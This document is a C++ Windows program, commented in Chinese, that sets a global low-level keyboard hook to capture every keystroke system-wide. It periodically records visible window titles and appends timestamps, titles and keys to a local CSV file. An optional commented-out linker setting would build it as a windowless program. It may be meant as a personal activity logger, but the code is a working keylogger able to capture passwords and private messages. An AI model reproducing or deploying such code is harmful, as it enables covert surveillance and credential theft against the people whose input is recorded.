//#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
#include <fstream>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <Windows.h>
#include <conio.h>
#include "GetKeyName.h"
#include <vector>
#include <algorithm>
#include <thread>
#include "INIFileParser.h"
const char* windowsToFilter[] = { "设置", "邮件" ,"Program Manager","Microsoft Store","Windows 输入体验" ,"MSN" ,"收件箱 - Outlook ?- 邮件" };
const int numWindowsToFilter = sizeof(windowsToFilter) / sizeof(windowsToFilter[0]);

bool timerPaused = false;
std::string windowTitles; // 用于存储窗口标题的字符串
std::vector<std::string> windowTitlesList; // 存储窗口标题的向量
std::string keyinput; // 存储按键输入的字符串
std::string timeString; // 存储时间字符串
int timeValue = 20;

void iniread() {
    INIFileParser parser("config.ini");

    std::string value = parser.getValue("Section1", "time");
    timeValue = std::stoi(value);

}

// 枚举窗口回调函数
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));

    if (IsWindowVisible(hwnd) && strlen(windowTitle) > 0) {
        // 检查窗口标题是否与过滤列表中的任何标题匹配
        bool shouldFilter = false;
        for (int i = 0; i < numWindowsToFilter; ++i) {
            if (strcmp(windowTitle, windowsToFilter[i]) == 0) {
                shouldFilter = true;
                break;
            }
        }

        // 如果窗口标题不匹配过滤列表中的任何标题，则将其添加到结果字符串中
        if (!shouldFilter) {
            windowTitlesList.push_back(windowTitle);
        }
    }
    return TRUE;
}

// 键盘钩子回调函数
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        keyinput += GetKeyName(pkbhs->vkCode);
    }
    // 调用下一个钩子
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// 将窗口标题向量转换为字符串
void TitlesString() {
    std::sort(windowTitlesList.begin(), windowTitlesList.end());
    auto it = std::unique(windowTitlesList.begin(), windowTitlesList.end());
    windowTitlesList.resize(std::distance(windowTitlesList.begin(), it));

    for (size_t i = 0; i < windowTitlesList.size(); ++i) {
        windowTitles += windowTitlesList[i];
        if (i < windowTitlesList.size() - 1) {
            windowTitles += "|";
        }
    }
    // 删除逗号
    size_t found = windowTitles.find(",");
    if (found != std::string::npos) {
        windowTitles.erase(std::remove(windowTitles.begin(), windowTitles.end(), ','), windowTitles.end());
    }
}

// 获取当前时间的字符串表示
void gettime() {
    auto currentTime = std::chrono::system_clock::now();
    std::time_t currentTimeT = std::chrono::system_clock::to_time_t(currentTime);
    std::tm localTime;
    localtime_s(&localTime, &currentTimeT);
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%Y|%m|%d|%H|%M|%S");
    timeString = oss.str();
}

// 将数据写入文件
void writefile(std::string timeString) {
    TitlesString();
    std::string writeletter = timeString + "," + windowTitles + "," + keyinput;

    std::ofstream csvFile("data.csv", std::ios::app);
    csvFile << writeletter << std::endl;
    csvFile.close();

    gettime();
    windowTitles = "";
    windowTitlesList.clear();
    keyinput = "";
    timerPaused = false;
}

// 检查按键输入字符串长度的线程函数
void checkStringLength() {
    while (true) {
        auto start_time = std::chrono::steady_clock::now();
        size_t current_length = keyinput.length();
        std::this_thread::sleep_for(std::chrono::seconds(timeValue));
        auto end_time = std::chrono::steady_clock::now();
        auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();

        // 检查字符串长度是否在10秒内没有变化
        if (keyinput.length() == current_length && elapsed_time >= timeValue-1 && keyinput != "") {
            timerPaused = true;
            writefile(timeString);
        }
    }
}

// 定时器回调函数，用于枚举窗口
void CALLBACK TimerProc2(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    if (!timerPaused) {
        EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), EnumWindowsProc, 0);
    }
}

int main() {
    iniread();
    gettime();
    std::thread lengthChecker(checkStringLength);
    SetTimer(NULL, 1, 2000, TimerProc2);
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;

    // 消息循环
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
